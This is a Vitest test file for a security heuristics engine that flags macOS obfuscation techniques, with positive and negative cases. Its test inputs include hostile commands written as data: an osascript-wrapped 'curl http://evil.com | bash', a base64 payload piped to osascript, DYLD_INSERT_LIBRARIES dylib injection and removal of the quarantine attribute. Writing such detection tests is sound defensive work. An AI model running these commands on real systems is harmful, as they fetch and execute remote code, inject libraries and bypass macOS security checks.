import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("macOS obfuscation threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- osascript 'do shell script' wrapping (CLT-MAC-OBFUS-001) ---

	it("detects osascript do shell script (001)", () => {
		expect(
			matchCommand(engine, "osascript -e 'do shell script \"curl http://evil.com | bash\"'"),
		).toContain("CLT-MAC-OBFUS-001");
	});

	// --- JXA execution (CLT-MAC-OBFUS-002) ---

	it("detects osascript -l JavaScript -e (002)", () => {
		expect(
			matchCommand(engine, 'osascript -l JavaScript -e \'ObjC.import("stdlib"); $.system("id")\''),
		).toContain("CLT-MAC-OBFUS-002");
	});

	// --- Base64 decode piped to osascript (CLT-MAC-OBFUS-003) ---

	it("detects base64 -D piped to osascript (003)", () => {
		expect(
			matchCommand(engine, "echo 'ZG8gc2hlbGwgc2NyaXB0ICJpZCI=' | base64 -D | osascript"),
		).toContain("CLT-MAC-OBFUS-003");
	});

	it("detects base64 --decode piped to osascript (003)", () => {
		expect(matchCommand(engine, "cat payload.b64 | base64 --decode | osascript")).toContain(
			"CLT-MAC-OBFUS-003",
		);
	});

	// --- DYLD_INSERT_LIBRARIES injection (CLT-MAC-OBFUS-004) ---

	it("detects DYLD_INSERT_LIBRARIES with .dylib (004)", () => {
		expect(matchCommand(engine, "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /usr/bin/target")).toContain(
			"CLT-MAC-OBFUS-004",
		);
	});

	it("detects DYLD_INSERT_LIBRARIES with .so (004)", () => {
		expect(matchCommand(engine, "DYLD_INSERT_LIBRARIES=/tmp/evil.so /usr/bin/target")).toContain(
			"CLT-MAC-OBFUS-004",
		);
	});

	// --- Quarantine attribute removal (CLT-MAC-OBFUS-005) ---

	it("detects xattr -d com.apple.quarantine (005)", () => {
		expect(matchCommand(engine, "xattr -d com.apple.quarantine /Applications/Evil.app")).toContain(
			"CLT-MAC-OBFUS-005",
		);
	});

	it("detects xattr -c com.apple.quarantine (005)", () => {
		expect(matchCommand(engine, "xattr -c com.apple.quarantine /tmp/payload")).toContain(
			"CLT-MAC-OBFUS-005",
		);
	});

	// Python encoded payload moved to obfuscation-threats.test.ts (CLT-OBFUS-008)

	// --- Plist conversion to binary (CLT-MAC-OBFUS-006) ---

	it("detects plutil -convert binary1 (006)", () => {
		expect(matchCommand(engine, "plutil -convert binary1 /tmp/evil.plist")).toContain(
			"CLT-MAC-OBFUS-006",
		);
	});

	// --- Swift inline execution (CLT-MAC-OBFUS-007) ---

	it("detects swift -e with Process (007)", () => {
		expect(
			matchCommand(
				engine,
				"swift -e 'import Foundation; let p = Process(); p.executableURL = URL(fileURLWithPath: \"/bin/sh\")'",
			),
		).toContain("CLT-MAC-OBFUS-007");
	});

	// --- Negative cases ---

	it("does not match osascript -e with display dialog", () => {
		const ids = matchCommand(engine, "osascript -e 'display dialog \"Hello\"'");
		expect(ids.filter((id) => id === "CLT-MAC-OBFUS-001")).toEqual([]);
	});

	it("does not match normal base64 decode (not to osascript)", () => {
		const ids = matchCommand(engine, "echo 'dGVzdA==' | base64 -D > /tmp/output.txt");
		expect(ids.filter((id) => id === "CLT-MAC-OBFUS-003")).toEqual([]);
	});

	it("does not match plutil -convert xml1 (harmless)", () => {
		const ids = matchCommand(engine, "plutil -convert xml1 /tmp/plist.plist");
		expect(ids.filter((id) => id === "CLT-MAC-OBFUS-006")).toEqual([]);
	});
});
